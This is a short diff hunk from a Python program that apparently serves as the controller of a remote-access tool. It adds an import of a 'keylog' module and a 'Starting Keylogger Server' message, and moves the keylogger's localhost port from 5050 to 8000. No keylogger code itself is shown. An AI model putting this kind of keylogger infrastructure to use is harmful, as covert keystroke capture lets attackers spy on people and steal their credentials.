@@ -5,11 +5,16 @@ import pyautogui
 import cv2 as cv
 import subprocess
 import pickle
+import keylog
+
+# Start keylogger server
+print("Starting Keylogger Server...")
+
 
 HEADER = 64 
 PORT = 5000
 SERVER = "127.0.0.1"
-KEYLOGGERADDR = ("127.0.0.1", 5050)
+KEYLOGGERADDR = ("127.0.0.1", 8000)
 ADDR = (SERVER, PORT)
 FORMAT = "utf-8"
 DISCONNECTED_MESSAGE = "DISCONNECT"
